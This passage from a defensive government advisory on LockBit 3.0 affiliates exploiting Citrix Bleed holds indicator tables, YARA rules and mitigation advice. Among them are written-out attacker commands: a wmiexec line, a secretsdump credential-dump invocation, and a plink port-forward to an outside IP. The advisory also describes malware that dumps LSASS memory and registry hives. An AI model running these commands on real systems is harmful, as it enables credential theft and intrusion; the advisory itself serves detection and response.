winmysqladmin.exe /im w3sqlmgr.exe /im sqlwb.exe /im sqltob.exe /im sqlservr.exe /im sqlserver.exe /im sqlscan.exe /im sqlbrowser.exe /im sqlrep.exe /im sqlmangr.exe /im sqlexp3.exe /im sqlexp2.exe /im sqlex</p>\n</td>\n<td>\n<p>Command</p>\n</td>\n<td>\n<p>High</p>\n</td>\n<td>\n<p>wmiexec.exe usage</p>\n</td>\n</tr><tr><td>\n<p>cmd.exe /q /c cd \\ 1&gt; \\\\127.0.0.1\\admin$\\__1698618133[.]54 2&gt;&amp;1</p>\n</td>\n<td>\n<p>Command</p>\n</td>\n<td>\n<p>High</p>\n</td>\n<td>\n<p>wmiexec.exe usage</p>\n</td>\n</tr></tbody></table><p>The authoring organizations recommended monitoring/reviewing traffic to the <code>81.19.135[.]*</code> class C network and review for MSHTA being called with HTTP arguments [<a href=\"https://www.mcafee.com/learn/what-is-mshta-how-can-it-be-used-and-how-to-protect-against-it/\" title=\"What Is Mshta, How Can It Be Used and How to Protect Against It\">2</a>].</p>\n<table class=\"MsoTableGrid tablesaw tablesaw-stack\" data-tablesaw-mode=\"stack\" data-tablesaw-minimap=\"\"><caption>Table 4: LockBit 3.0 Affiliate Citrix Bleed Campaign</caption>\n<thead><tr><th scope=\"col\" role=\"columnheader\" data-tablesaw-priority=\"persist\">\n<p><strong>Indicator</strong></p>\n</th>\n<th scope=\"col\" role=\"columnheader\">\n<p><strong>Type</strong></p>\n</th>\n<th scope=\"col\" role=\"columnheader\">\n<p><strong>Fidelity</strong></p>\n</th>\n<th scope=\"col\" role=\"columnheader\">\n<p><strong>Description</strong></p>\n</th>\n<th scope=\"col\" role=\"columnheader\">\n<p><strong>Notes</strong></p>\n</th>\n</tr></thead><tbody><tr><td>\n<p>81.19.135[.]219</p>\n</td>\n<td>\n<p>IP</p>\n</td>\n<td>\n<p>High</p>\n</td>\n<td>\n<p>Russian geolocated IP used by user to request mshta with http arguments to download random named HTA file named q0X5wzzEh6P7.hta</p>\n</td>\n<td>\n<p> </p>\n</td>\n</tr><tr><td>\n<p>81.19.135[.]220</p>\n</td>\n<td>\n<p>IP</p>\n</td>\n<td>\n<p>High</p>\n</td>\n<td>\n<p>Russian geolocated IP, seen outbound in logs</p>\n</td>\n<td>\n<p>IP registered to a South African Company</p>\n</td>\n</tr><tr><td>\n<p>81.19.135[.]226</p>\n</td>\n<td>\n<p>IP</p>\n</td>\n<td>\n<p>High</p>\n</td>\n<td>\n<p>Russian geolocated IP, seen outbound in logs</p>\n</td>\n<td>\n<p>IP registered to a South African Company</p>\n</td>\n</tr></tbody></table><table class=\"MsoTableGrid tablesaw tablesaw-stack\" data-tablesaw-mode=\"stack\" data-tablesaw-minimap=\"\"><caption><em>Table 5: Citrix Bleed Indicators of Compromise (IOCs)</em></caption>\n<thead><tr><th scope=\"col\" role=\"columnheader\" data-tablesaw-priority=\"persist\">\n<p><strong>Type</strong></p>\n</th>\n<th scope=\"col\" role=\"columnheader\">\n<p><strong>Indicator</strong></p>\n</th>\n<th scope=\"col\" role=\"columnheader\">\n<p><strong>Description</strong></p>\n</th>\n</tr></thead><tbody><tr><td>\n<p>Filename</p>\n</td>\n<td>\n<p>c:\\users\\&lt;username&gt;\\downloads\\process hacker 2\\peview.exe</p>\n</td>\n<td>\n<p>Process hacker</p>\n</td>\n</tr><tr><td>\n<p>Filename</p>\n</td>\n<td>\n<p>c:\\users\\&lt;username&gt;\\music\\process hacker 2\\processhacker.exe</p>\n</td>\n<td>\n<p>Process hacker</p>\n</td>\n</tr><tr><td>\n<p>Filename</p>\n</td>\n<td>\n<p>psexesvc.exe</p>\n</td>\n<td>\n<p>Psexec service excutable</p>\n</td>\n</tr><tr><td>\n<p>Filename</p>\n</td>\n<td>\n<p>c:\\perflogs\\processhacker.exe</p>\n</td>\n<td>\n<p>Process hacker</p>\n</td>\n</tr><tr><td>\n<p>Filename</p>\n</td>\n<td>\n<p>c:\\windows\\temp\\screenconnect\\23.8.5.8707\\files\\processhacker.exe</p>\n</td>\n<td>\n<p>Process hacker transferred via screenconnect</p>\n</td>\n</tr><tr><td>\n<p>Filename</p>\n</td>\n<td>\n<p>c:\\perflogs\\lsass.dmp</p>\n</td>\n<td>\n<p>Lsass dump</p>\n</td>\n</tr><tr><td>\n<p>Filename</p>\n</td>\n<td>\n<p>c:\\users\\&lt;username&gt;\\downloads\\mimikatz.exe</p>\n</td>\n<td>\n<p>Mimikatz</p>\n</td>\n</tr><tr><td>\n<p>Filename</p>\n</td>\n<td>\n<p>c:\\users\\&lt;username&gt;\\desktop\\proc64\\proc.exe</p>\n</td>\n<td>\n<p>Procdump</p>\n</td>\n</tr><tr><td>\n<p>Filename</p>\n</td>\n<td>\n<p>c:\\users\\&lt;username&gt;\\documents\\veeam-get-creds.ps1</p>\n</td>\n<td>\n<p>Decrypt veeam creds</p>\n</td>\n</tr><tr><td>\n<p>Filename</p>\n</td>\n<td>\n<p>secretsdump.py</p>\n</td>\n<td>\n<p>Impacket installed on azure vm</p>\n</td>\n</tr><tr><td>\n<p>Cmdline</p>\n</td>\n<td>\n<p>secretsdump.py &lt;domain&gt;/&lt;username&gt;@&lt;ip&gt; -outputfile 1</p>\n</td>\n<td>\n<p>Impacket installed on azure vm</p>\n</td>\n</tr><tr><td>\n<p>Filename</p>\n</td>\n<td>\n<p>ad.ps1</p>\n</td>\n<td>\n<p>Adrecon found in powershell transcripts</p>\n</td>\n</tr><tr><td>\n<p>Filename</p>\n</td>\n<td>\n<p>c:\\perflogs\\64-bit\\netscan.exe</p>\n</td>\n<td>\n<p>Softperfect netscan</p>\n</td>\n</tr><tr><td>\n<p>Filename</p>\n</td>\n<td>\n<p>tniwinagent.exe</p>\n</td>\n<td>\n<p>Total network inventory agent</p>\n</td>\n</tr><tr><td>\n<p>Filename</p>\n</td>\n<td>\n<p>psexec.exe</p>\n</td>\n<td>\n<p>Psexec used to deploy screenconnect</p>\n</td>\n</tr><tr><td>\n<p>Filename</p>\n</td>\n<td>\n<p>7z.exe</p>\n</td>\n<td>\n<p>Used to compress files</p>\n</td>\n</tr><tr><td>\n<p>Tool</p>\n</td>\n<td>\n<p>Action1</p>\n</td>\n<td>\n<p>RMM</p>\n</td>\n</tr><tr><td>\n<p>Tool</p>\n</td>\n<td>\n<p>Atera</p>\n</td>\n<td>\n<p>RMM</p>\n</td>\n</tr><tr><td>\n<p>tool</p>\n</td>\n<td>\n<p>anydesk</p>\n</td>\n<td>\n<p>rmm</p>\n</td>\n</tr><tr><td>\n<p>tool</p>\n</td>\n<td>\n<p>fixme it</p>\n</td>\n<td>\n<p>rmm</p>\n</td>\n</tr><tr><td>\n<p>tool</p>\n</td>\n<td>\n<p>screenconnect</p>\n</td>\n<td>\n<p>rmm</p>\n</td>\n</tr><tr><td>\n<p>tool</p>\n</td>\n<td>\n<p>splashtop</p>\n</td>\n<td>\n<p>rmm</p>\n</td>\n</tr><tr><td>\n<p>tool</p>\n</td>\n<td>\n<p>zoho assist</p>\n</td>\n<td>\n<p>rmm</p>\n</td>\n</tr><tr><td>\n<p>ipv4</p>\n</td>\n<td>\n<p>101.97.36[.]61</p>\n</td>\n<td>\n<p>zoho assist</p>\n</td>\n</tr><tr><td>\n<p>ipv4</p>\n</td>\n<td>\n<p>168.100.9[.]137</p>\n</td>\n<td>\n<p>ssh portforwarding infra</p>\n</td>\n</tr><tr><td>\n<p>ipv4</p>\n</td>\n<td>\n<p>185.20.209[.]127</p>\n</td>\n<td>\n<p>zoho assist</p>\n</td>\n</tr><tr><td>\n<p>ipv4</p>\n</td>\n<td>\n<p>185.230.212[.]83</p>\n</td>\n<td>\n<p>zoho assist</p>\n</td>\n</tr><tr><td>\n<p>ipv4</p>\n</td>\n<td>\n<p>206.188.197[.]22</p>\n</td>\n<td>\n<p>powershell reverse shell seen in powershell logging</p>\n</td>\n</tr><tr><td>\n<p>ipv4</p>\n</td>\n<td>\n<p>54.84.248[.]205</p>\n</td>\n<td>\n<p>fixme ip</p>\n</td>\n</tr><tr><td>\n<p>Ipv4</p>\n</td>\n<td>\n<p>141.98.9[.]137</p>\n</td>\n<td>\n<p>Remote IP for CitrixBleed</p>\n</td>\n</tr><tr><td>\n<p>domain</p>\n</td>\n<td>\n<p>assist.zoho.eu</p>\n</td>\n<td>\n<p>zoho assist</p>\n</td>\n</tr><tr><td>\n<p>filename</p>\n</td>\n<td>\n<p>c:\\perflogs\\1.exe</p>\n</td>\n<td>\n<p>connectwise renamed</p>\n</td>\n</tr><tr><td>\n<p>filename</p>\n</td>\n<td>\n<p>c:\\perflogs\\run.exe</p>\n</td>\n<td>\n<p>screenconnect pushed by psexec</p>\n</td>\n</tr><tr><td>\n<p>filename</p>\n</td>\n<td>\n<p>c:\\perflogs\\64-bit\\m.exe</p>\n</td>\n<td>\n<p>connectwise renamed</p>\n</td>\n</tr><tr><td>\n<p>filename</p>\n</td>\n<td>\n<p>c:\\perflogs\\64-bit\\m0.exe</p>\n</td>\n<td>\n<p>connectwise renamed</p>\n</td>\n</tr><tr><td>\n<p>filename</p>\n</td>\n<td>\n<p>c:\\perflogs\\za_access_my_department.exe</p>\n</td>\n<td>\n<p>zoho remote assist</p>\n</td>\n</tr><tr><td>\n<p>filename</p>\n</td>\n<td>\n<p>c:\\users\\&lt;username&gt;\\music\\za_access_my_department.exe</p>\n</td>\n<td>\n<p>zoho remote assist</p>\n</td>\n</tr><tr><td>\n<p>filename</p>\n</td>\n<td>\n<p>c:\\windows\\servicehost.exe</p>\n</td>\n<td>\n<p>plink renamed</p>\n</td>\n</tr><tr><td>\n<p>filename</p>\n</td>\n<td>\n<p>c:\\windows\\sysconf.bat</p>\n</td>\n<td>\n<p>runs servicehost.exe (plink) command</p>\n</td>\n</tr><tr><td>\n<p>filename</p>\n</td>\n<td>\n<p>c:\\windows\\temp\\screenconnect\\23.8.5.8707\\files\\azure.msi</p>\n</td>\n<td>\n<p>zoho remote assist used to transfer data via screenconnect</p>\n</td>\n</tr><tr><td>\n<p>cmdline</p>\n</td>\n<td>\n<p>echo enter | c:\\windows\\servicehost.exe -ssh -r 8085:127.0.0.1:8085 &lt;username&gt;@168.100.9[.]137 -pw &lt;password&gt;</p>\n</td>\n<td>\n<p>plink port forwarding</p>\n</td>\n</tr><tr><td>\n<p>domain</p>\n</td>\n<td>\n<p>eu1-dms.zoho[.]eu</p>\n</td>\n<td>\n<p>zoho assist</p>\n</td>\n</tr><tr><td>\n<p>domain</p>\n</td>\n<td>\n<p>fixme[.]it</p>\n</td>\n<td>\n<p>fixme it</p>\n</td>\n</tr><tr><td>\n<p>domain</p>\n</td>\n<td>\n<p>unattended.techinline[.]net</p>\n</td>\n<td>\n<p>fixme it</p>\n</td>\n</tr></tbody></table><h3>MITRE ATT&amp;CK TACTICS AND TECHNIQUES</h3>\n<p>See Table 6 and Table 7 for all referenced threat actor tactics and techniques in this advisory.</p>\n<table class=\"Table tablesaw tablesaw-stack\" data-tablesaw-mode=\"stack\" data-tablesaw-minimap=\"\"><caption><em>Table 6: ATT&amp;CK Techniques for Enterprise: Discovery</em></caption>\n<thead><tr><th scope=\"col\" role=\"columnheader\" data-tablesaw-priority=\"persist\">\n<p><strong>Technique Title</strong></p>\n</th>\n<th scope=\"col\" role=\"columnheader\">\n<p><strong>ID</strong></p>\n</th>\n<th scope=\"col\" role=\"columnheader\">\n<p><strong>Use</strong></p>\n</th>\n</tr></thead><tbody><tr><td>\n<p>System Information Discovery</p>\n</td>\n<td>\n<p><a href=\"https://attack.mitre.org/versions/v14/techniques/T1082/\" title=\"System Information Discovery\">T1082</a></p>\n</td>\n<td>\n<p>Threat actors will attempt to obtain information about the operating system and hardware, including versions, and patches.</p>\n</td>\n</tr></tbody></table><table class=\"Table tablesaw tablesaw-stack\" data-tablesaw-mode=\"stack\" data-tablesaw-minimap=\"\"><caption><em>Table 7: ATT&amp;CK Techniques for Enterprise: Credential Access</em></caption>\n<thead><tr><th scope=\"col\" role=\"columnheader\" data-tablesaw-priority=\"persist\">\n<p><strong>Technique Title</strong></p>\n</th>\n<th scope=\"col\" role=\"columnheader\">\n<p><strong>ID</strong></p>\n</th>\n<th scope=\"col\" role=\"columnheader\">\n<p><strong>Use</strong></p>\n</th>\n</tr></thead><tbody><tr><td>\n<p>Modify Authentication Process: Multifactor Authentication</p>\n</td>\n<td>\n<p><a href=\"https://attack.mitre.org/versions/v14/techniques/T1556/006/\" title=\"Modify Authentication Process: Multifactor Authentication\">T1556.006</a></p>\n</td>\n<td>\n<p>Threat actors leverage vulnerabilities found within CVE- to compromise, modify, and/or bypass multifactor authentication to hijack user sessions, harvest credentials, and move laterally, which enables persistent access.</p>\n</td>\n</tr><tr><td>\n<p>Steal Web Session Cookie</p>\n</td>\n<td>\n<p><a href=\"https://attack.mitre.org/versions/v14/techniques/T1539/\" title=\"Steal Web Session Cookie\">T1539</a></p>\n</td>\n<td>\n<p>Threat actors with access to valid cookies can establish an authenticated session within the NetScaler appliance without a username, password, or access to multifactor authentication (MFA) tokens.</p>\n</td>\n</tr></tbody></table><h3>DETECTION METHODS</h3>\n<h4><strong>Hunting Guidance</strong></h4>\n<p>Network defenders should prioritize observing users in session when hunting for network anomalies. This will aid the hunt for suspicious activity such as installing tools on the system (e.g., putty, rClone ), new account creation, log item failure, or running commands such as hostname, quser, whoami, net, and taskkill. Rotating credentials for identities provisioned for accessing resources via a vulnerable NetScaler ADC or Gateway appliance can also aid in detection.</p>\n<p>For IP addresses:</p>\n<ul><li>Identify if NetScaler logs the change in IP.</li>\n<li>Identify if users are logging in from geolocations uncommon for your organization’s user base.</li>\n<li>If logging VPN authentication, identify if users are associated with two or more public IP addresses while in a different subnet or geographically dispersed.</li>\n</ul><p><strong>Note: </strong>MFA to NetScaler will not operate as intended due to the attacker bypassing authentication by providing a token/session for an already authenticated user.</p>\n<p>The following procedures can help identify potential exploitation of CVE-2023-4966 and LockBit 3.0 activity:</p>\n<ul><li>Search for filenames that contain <code>tf0gYx2YI</code> for identifying LockBit encrypted files.</li>\n<li>LockBit 3.0 actors were seen using the <code>C:\\Temp</code> directory for loading and the execution of files.</li>\n<li>Investigate requests to the HTTP/S endpoint from WAF.</li>\n<li>Hunt for suspicious login patterns from NetScaler logs</li>\n<li>Hunt for suspicious virtual desktop agent Windows Registry keys</li>\n<li>Analyze memory core dump files.</li>\n</ul><p>Below, are CISA developed YARA rules and an open-source rule that may be used to detect malicious activity in the Citrix NetScaler ADC and Gateway software environment. For more information on detecting suspicious activity within NetScaler logs or additional resources, visit CISA’s Malware Analysis Report (MAR) <a href=\"https://www.cisa.gov/news-events/analysis-reports/ar23-325a\">MAR-10478915-1.v1 Citrix Bleed</a> or the resource section of this CSA [<a href=\"https://www.mandiant.com/resources/blog/session-hijacking-citrix-cve-2023-4966\" title=\"Investigation of Session Hijacking via Citrix NetScaler ADC and Gateway Vulnerability (CVE-2023-4966)\">3</a>]:</p>\n<h4><strong>YARA Rules</strong></h4>\n<p>CISA received four files for analysis that show files being used to save registry hives, dump the Local Security Authority Subsystem Service (LSASS) process memory to disk, and attempt to establish sessions via Windows Remote Management (WinRM). The files include:</p>\n<ul><li>Windows Batch file (.bat)</li>\n<li>Windows Executable (.exe)</li>\n<li>Windows Dynamic Link Library (.dll)</li>\n<li>Python Script (.py)</li>\n</ul><table><tbody><tr><td><code>rule CISA_10478915_01 : trojan installs_other_components<br />\n\t\t\t{<br />\n\t\t\tmeta:<br />\n\t\t\tauthor = \"CISA Code &amp; Media Analysis\"<br />\n\t\t\tincident = \"10478915\"<br />\n\t\t\tdate = \"2023-11-06\"<br />\n\t\t\tlast_modified = \"20231108_1500\"<br />\n\t\t\tactor = \"n/a\"<br />\n\t\t\tfamily = \"n/a\"<br />\n\t\t\tcapabilities = \"installs-other-components\"<br />\n\t\t\tmalware_Type = \"trojan\"<br />\n\t\t\ttool_type = \"information-gathering\"<br />\n\t\t\tdescription = \"Detects trojan .bat samples\"<br />\n\t\t\tsha256 = \"98e79f95cf8de8ace88bf223421db5dce303b112152d66ffdf27ebdfcdf967e9\"<br />\n\t\t\tstrings:<br />\n\t\t\t$s1 = { 63 3a 5c 77 69 6e 64 6f 77 73 5c 74 61 73 6b 73 5c 7a 2e 74 78 74 }<br />\n\t\t\t$s2 = { 72 65 67 20 73 61 76 65 20 68 6b 6c 6d 5c 73 79 73 74 65 6d 20 63 3a 5c 77 69 6e 64 6f 77 73 5c 74 61 73 6b 73<br />\n\t\t\t5c 65 6d }<br />\n\t\t\t$s3 = { 6d 61 6b 65 63 61 62 20 63 3a 5c 75 73 65 72 73 5c 70 75 62 6c 69 63 5c 61 2e 70 6e 67 20 63 3a 5c 77 69 6e 64<br />\n\t\t\t6f 77 73 5c 74 61 73 6b 73 5c 61 2e 63 61 62 }<br />\n\t\t\tcondition:<br />\n\t\t\tall of them<br />\n\t\t\t}</code></td>\n</tr></tbody></table><p>This file is a Windows batch file called a.bat that is used to execute the file called a.exe with the file called a.dll as an argument. The output is printed to a file named 'z.txt' located in the path C:\\Windows\\Tasks. Next, a.bat pings the loop back internet protocol (IP) address 127.0.0[.]1 three times.</p>\n<p>The next command it runs is reg save to save the HKLM\\SYSTEM registry hive into the C:\\Windows\\tasks\\em directory. Again, a.bat pings the loop back address 127.0.0[.]1 one time before executing another reg save command and saves the HKLM\\SAM registry hive into the C:\\Windows\\Task\\am directory. Next, a.bat runs three makecab commands to create three cabinet (.cab) files from the previously mentioned saved registry hives and one file named C:\\Users\\Public\\a.png. The names of the .cab files are as follows:</p>\n<ul><li>c:\\windows\\tasks\\em.cab</li>\n<li>c:\\windows\\tasks\\am.cab</li>\n<li>c:\\windows\\tasks\\a.cab</li>\n</ul><table class=\"MsoTableGrid\"><tbody><tr><td>\n<p><code>rule CISA_10478915_02 : trojan installs_other_components<br />\n\t\t\t{<br />\n\t\t\tmeta:<br />\n\t\t\tauthor = \"CISA Code &amp; Media Analysis\"<br />\n\t\t\tincident = \"10478915\"<br />\n\t\t\tdate = \"2023-11-06\"<br />\n\t\t\tlast_modified = \"20231108_1500\"<br />\n\t\t\tactor = \"n/a\"<br />\n\t\t\tfamily = \"n/a\"<br />\n\t\t\tcapabilities = \"installs-other-components\"<br />\n\t\t\tmalware_type = \"trojan\"<br />\n\t\t\ttool_type = \"unknown\"<br />\n\t\t\tdescription = \"Detects trojan PE32 samples\"<br />\n\t\t\tsha256 = \"e557e1440e394537cca71ed3d61372106c3c70eb6ef9f07521768f23a0974068\"<br />\n\t\t\tstrings:<br />\n\t\t\t$s1 = { 57 72 69 74 65 46 69 6c 65 }<br />\n\t\t\t$s2 = { 41 70 70 50 6f 6c 69 63 79 47 65 74 50 72 6f 63 65 73 73 54 65 72 6d 69 6e 61 74 69 6f 6e 4d 65 74 68 6f 64 }<br />\n\t\t\t$s3 = { 6f 70 65 72 61 74 6f 72 20 63 6f 5f 61 77 61 69 74 }<br />\n\t\t\t$s4 = { 43 6f 6d 70 6c 65 74 65 20 4f 62 6a 65 63 74 20 4c 6f 63 61 74 6f 72 }<br />\n\t\t\t$s5 = { 64 65 6c 65 74 65 5b 5d }<br />\n\t\t\t$s6 = { 4e 41 4e 28 49 4e 44 29 }<br />\n\t\t\tcondition:<br />\n\t\t\tuint16(0) == 0x5a4d and pe.imphash() == \"6e8ca501c45a9b85fff2378cffaa24b2\" and pe.size_of_code == 84480 and all of<br />\n\t\t\tthem<br />\n\t\t\t}</code></p>\n</td>\n</tr></tbody></table><p>This file is a 64-bit Windows command-line executable called a.exe that is executed by a.bat. This file issues the remote procedure call (RPC) ncalrpc:[lsasspirpc] to the RPC end point to provide a file path to the LSASS on the infected machine. Once the file path is returned, the malware loads the accompanying DLL file called a.dll into the running LSASS process. If the DLL is correctly loaded, then the malware outputs the message \"[*]success\" in the console.</p>\n<table class=\"MsoTableGrid\"><tbody><tr><td>\n<p><code>rule CISA_10478915_03 : trojan steals_authentication_credentials credential_exploitation<br />\n\t\t\t{<br />\n\t\t\tmeta:<br />\n\t\t\tauthor = \"CISA Code &amp; Media Analysis\"<br />\n\t\t\tincident = \"10478915\"<br />\n\t\t\tdate = \"2023-11-06\"<br />\n\t\t\tlast_modified = \"20231108_1500\"<br />\n\t\t\tactor = \"n/a\"<br />\n\t\t\tfamily = \"n/a\"<br />\n\t\t\tcapabilities = \"steals-authentication-credentials\"<br />\n\t\t\tmalware_type = \"trojan\"<br />\n\t\t\ttool_type = \"credential-exploitation\"<br />\n\t\t\tdescription = \"Detects trojan DLL samples\"<br />\n\t\t\tsha256 = \"17a27b1759f10d1f6f1f51a11c0efea550e2075c2c394259af4d3f855bbcc994\"<br />\n\t\t\tstrings:<br />\n\t\t\t$s1 = { 64 65 6c 65 74 65 }<br />\n\t\t\t$s2 = { 3c 2f 74 72 75 73 74 49 6e 66 6f 3e }<br />\n\t\t\t$s3 = { 42 61 73 65 20 43 6c 61 73 73 20 44 65 73 63 72 69 70 74 6f 72 20 61 74 20 28 }<br />\n\t\t\t$s4 = { 49 6e 69 74 69 61 6c 69 7a 65 43 72 69 74 69 63 61 6c 53 65 63 74 69 6f 6e 45 78 }<br />\n\t\t\t$s5 = { 46 69 6e 64 46 69 72 73 74 46 69 6c 65 45 78 57 }<br />\n\t\t\t$s6 = { 47 65 74 54 69 63 6b 43 6f 75 6e 74 }<br />\n\t\t\tcondition:<br />\n\t\t\tuint16(0) == 0x5a4d and pe.subsystem == pe.SUBSYSTEM_WINDOWS_CUI and pe.size_of_code == 56832 and all of<br />\n\t\t\tthem<br />\n\t\t\t}</code></p>\n</td>\n</tr></tbody></table><p>This file is a 64-bit Windows DLL called a.dll that is executed by a.bat as a parameter for the file a.exe. The file a.exe loads this file into the running LSASS process on the infected machine. The file a.dll calls the Windows API CreateFileW to create a file called a.png in the path C:\\Users\\Public.</p>\n<p>Next, a.dll loads DbgCore.dll then utilizes MiniDumpWriteDump function to dump LSASS process memory to disk. If successful, the dumped process memory is written to a.png. Once this is complete, the file a.bat specifies that the file a.png is used to create the cabinet file called a.cab in the path C:\\Windows\\Tasks.</p>\n<table class=\"MsoTableGrid\"><tbody><tr><td>\n<p><code>rule CISA_10478915_04 : backdoor communicates_with_c2 remote_access<br />\n\t\t\t{<br />\n\t\t\tmeta:<br />\n\t\t\tauthor = \"CISA Code &amp; Media Analysis\"<br />\n\t\t\tincident = \"10478915\"<br />\n\t\t\tdate = \"2023-11-06\"<br />\n\t\t\tlast_modified = \"20231108_1500\"<br />\n\t\t\tactor = \"n/a\"<br />\n\t\t\tfamily = \"n/a\"<br />\n\t\t\tcapabilities = \"communicates-with-c2\"<br />\n\t\t\tmalware_type = \"backdoor\"<br />\n\t\t\ttool_type = \"remote-access\"<br />\n\t\t\tdescription = \"Detects trojan python samples\"<br />\n\t\t\tsha256 = \"906602ea3c887af67bcb4531bbbb459d7c24a2efcb866bcb1e3b028a51f12ae6\"<br />\n\t\t\tstrings:<br />\n\t\t\t$s1 = { 70 6f 72 74 20 3d 20 34 34 33 20 69 66 20 22 68 74 74 70 73 22 }<br />\n\t\t\t$s2 = { 6b 77 61 72 67 73 2e 67 65 74 28 22 68 61 73 68 70 61 73 73 77 64 22 29 3a }<br />\n\t\t\t$s3 = { 77 69 6e 72 6d 2e 53 65 73 73 69 6f 6e 20 62 61 73 69 63 20 65 72 72 6f 72 }<br />\n\t\t\t$s4 = { 57 69 6e 64 77 6f 73 63 6d 64 2e 72 75 6e 5f 63 6d 64 28 73 74 72 28 63 6d 64 29 29 }<br />\n\t\t\tcondition:<br />\n\t\t\tall of them<br />\n\t\t\t}</code></p>\n</td>\n</tr></tbody></table><p>This file is a Python script called a.py that attempts to leverage WinRM to establish a session. The script attempts to authenticate to the remote machine using NT LAN Manager (NTLM) if the keyword \"hashpasswd\" is present. If the keyword \"hashpasswd\" is not present, then the script attempts to authenticate using basic authentication. Once a WinRM session is established with the remote machine, the script has the ability to execute command line arguments on the remote machine. If there is no command specified, then a default command of “whoami” is run.</p>\n<h4><strong>Open Source YARA Rule</strong></h4>\n<table><tbody><tr><td><code>Import \"pe\" <br />\n\t\t\trule M_Hunting_Backdoor_FREEFIRE <br />\n\t\t\t{<br />\n\t\t\tmeta: author = \"Mandiant\" <br />\n\t\t\tdescription = \"This is a hunting rule to detect FREEFIRE samples using OP code sequences in getLastRecord method\"<br />\n\t\t\t md5 = \"eb842a9509dece779d138d2e6b0f6949\" <br />\n\t\t\tmalware_family = \"FREEFIRE\" <br />\n\t\t\tstrings: $s1 = { 72 ?? ?? ?? ?? 7E ?? ?? ?? ?? 72 ?? ?? ?? ?? 28 ?? ?? ?? ?? 28 ?? ?? ?? ?? 74 ?? ?? ?? ?? 25 72 ?? ?? ?? ?? 6F ?? ?? ?? ?? 25 72 ?? ?? ?? ?? 6F ?? ?? ?? ?? 25 6F ?? ?? ?? ?? 72 ?? ?? ?? ?? 72 ?? ?? ?? ?? 7E ?? ?? ?? ?? 28 ?? ?? ?? ?? 6F ?? ?? ?? ?? 6F ?? ?? ?? ?? 74 ?? ?? ?? ?? 25 6F ?? ?? ?? ?? 73 ?? ?? ?? ?? 6F ?? ?? ?? ?? ?? 6F ?? ?? ?? ?? 7E ?? ?? ?? ?? ?? 6F ?? ?? ?? ?? 72 ?? ?? ?? ?? ?? 6F ?? ?? ?? ?? ?? <br />\n\t\t\t} <br />\n\t\t\tcondition: <br />\n\t\t\tuint16(0) == 0x5A4D <br />\n\t\t\tand filesize &gt;= 5KB <br />\n\t\t\tand pe.imports(\"mscoree.dll\") <br />\n\t\t\tand all of them }</code></td>\n</tr></tbody></table><h3><strong>INCIDENT RESPONSE</strong></h3>\n<p>Organizations are encouraged to assess Citrix software and your systems for evidence of compromise, and to hunt for malicious activity (see Additional Resources section).If compromise is suspected or detected, organizations should assume that threat actors hold full administrative access and can perform all tasks associated with the web management software as well as installing malicious code.</p>\n<p>If a potential compromise is detected, organizations should:</p>\n<ol><li>Quarantine or take offline potentially affected hosts.</li>\n<li>Reimage compromised hosts.</li>\n<li>Create new account credentials.</li>\n<li>Collect and review artifacts such as running processes/services, unusual authentications, and recent network connections.\n<ul><li><strong>Note:</strong> Removing malicious administrator accounts may not fully mitigate risk considering threat actors may have established additional persistence mechanisms.</li>\n</ul></li>\n<li>Report the compromise to FBI Internet Crime Complaint Center (IC3) at IC3.gov, local FBI Field Office, or CISA via the agency’s Incident Reporting System or its 24/7 Operations Center (<a href=\"mailto:report@cisa.gov\">report@cisa.gov</a> or 888-282-0870). State, local, tribal, or territorial government (SLTT) entities can also report to MS-ISAC (<a href=\"mailto:SOC@cisecurity.org\">SOC@cisecurity.org</a> or 866-787-4722). If outside of the US, please contact your national cyber center.</li>\n</ol><h3>MITIGATIONS</h3>\n<p>These mitigations apply to all critical infrastructure organizations and network defenders using Citrix NetScaler ADC and Gateway software. CISA and authoring organizations recommend that software manufacturers incorporate secure-by-design and -default principles and tactics into their software development practices to limit the impact of exploitation such as threat actors leveraging unpatched vulnerabilities within Citrix NetScaler appliances, which strengthens the security posture of their customers.</p>\n<p>For more information on secure by design, see CISA’s <a href=\"https://www.cisa.gov/securebydesign\" title=\"Secure by Design\">Secure by Design and Default</a> webpage and <a href=\"https://www.cisa.gov/resources-tools/resources/secure-by-design-and-default\" title=\"Shifting the Balance of Cybersecurity Risk: Principles and Approaches for Secure by Design Software\">joint guide</a>.</p>\n<p>The authoring organizations of this CSA recommend organizations implement the mitigations below to improve your cybersecurity posture on the basis of the threat actor activity and to reduce the risk of compromise associated with Citrix CVE 2023-4966 and LockBit 3.0 ransomware &amp; ransomware affiliates. These mitigations align with the Cross-Sector Cybersecurity performance goals (CPGs) developed by CISA and the National Institute of Standards and Technology (NIST). The CPGs provide a minimum set of practices and protections that CISA and NIST recommend all organizations implement. CISA and NIST based the CPGs on existing cybersecurity frameworks and guidance to protect against the most common and impactful threats, tactics, techniques, and procedures. Visit CISA’s <a href=\"https://www.cisa.gov/cross-sector-cybersecurity-performance-goals\" title=\"Cross-Sector Cybersecurity Performance Goals\">Cross-Sector Cybersecurity Performance Goals</a> for more information on the CPGs, including additional recommended baseline protections.</p>\n<ul><li><strong>Isolate NetScaler ADC and Gateway appliances </strong>for testing until patching is ready and deployable.</li>\n<li><strong>Secure remote access tools by:</strong>\n<ul><li><strong>Implement application controls</strong> to manage and control the execution of software, including allowlisting remote access programs. Application controls should prevent the installation and execution of portable versions of unauthorized remote access and other software. A properly configured application allowlisting solution will block any unlisted application execution. Allowlisting is important because antivirus solutions may fail to detect the execution of malicious portable executables when the files use any combination of compression, encryption, or obfuscation.</li>\n</ul></li>\n<li><strong>Strictly limit the use of RDP and other remote desktop services</strong>. If RDP is necessary, rigorously apply best practices, for example [<a href=\"/sites/default/files/2023-03/CISA_CPG_REPORT_v1.0.1_FINAL.pdf\" title=\"Cross-Sector Cybersecurity Performance Goals March 2023 Update\">CPG 2.W</a>]:\n<ul><li>Audit the network for systems using RDP.</li>\n<li>Close unused RDP ports.</li>\n<li>Enforce account lockouts after a specified number of attempts.</li>\n<li>Apply <a href=\"/sites/default/files/publications/fact-sheet-implementing-phishing-resistant-mfa-508c.pdf\" title=\"Implementing Phishing-Resistant MFA\">phishing-resistant multifactor authentication (MFA)</a>.</li>\n<li>Log RDP login attempts.</li>\n</ul></li>\n<li><strong>Restrict the use of PowerShell</strong>, using Group Policy, and only grant access to specific users on a case-by-case basis. Typically, only those users or administrators who manage the network or Windows operating systems (OSs) should be permitted to use PowerShell [<a href=\"/sites/default/files/2023-03/CISA_CPG_REPORT_v1.0.1_FINAL.pdf\" title=\"Cross-Sector Cybersecurity Performance Goals March 2023 Update\">CPG 2.E</a>].</li>\n<li><strong>Update Windows PowerShell or PowerShell Core</strong> to the latest version and uninstall all earlier 